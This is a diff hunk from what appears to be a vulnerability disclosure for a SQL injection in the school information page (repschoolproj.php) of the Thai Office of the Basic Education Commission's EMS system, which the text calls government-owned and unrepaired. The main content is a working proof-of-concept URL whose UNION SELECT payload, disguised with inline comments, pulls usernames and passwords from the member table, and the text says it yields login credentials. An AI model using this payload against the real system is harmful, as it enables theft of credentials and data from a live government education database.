@@ -8,7 +8,7 @@ E-mes is an education management system of Thailand's basic education department
 > A SQL injection vulnerability exists in the school information query interface (repschoolproj.php) of the EMS system of the Office of the Thai Basic Education Commission, which can lead to important data leakage.This website is owned by the Thai government, and if it is not repaired in time, it may lead to information leakage.
 
 `POC:` 
-> http://localhost/eme/repschoolproj.php?claster=school&idarea=648 repschoolproj.php?claster=school&idarea=648  /**/uNiOn select/**/ 1,1,user,1,1,1,1,1,2,3,4,5,6,7,1,1,9,10,passwd,12,13,1,1,1,1,user(),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 from member#  
+> http://localhost/eme/repschoolproj.php?claster=school&idarea=648 repschoolproj.php?claster=school&idarea=648  /** /uNiOn select/* */ 1,1,user,1,1,1,1,1,2,3,4,5,6,7,1,1,9,10,passwd,12,13,1,1,1,1,user(),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 from member#  
 > This exp can get the login account and password of the e-mes system  
 `photo proof`
 ![图片](https://user-images.githubusercontent.com/110643835/188271982-779a174a-41e3-47dd-b9eb-3ed62e59b4bb.png)
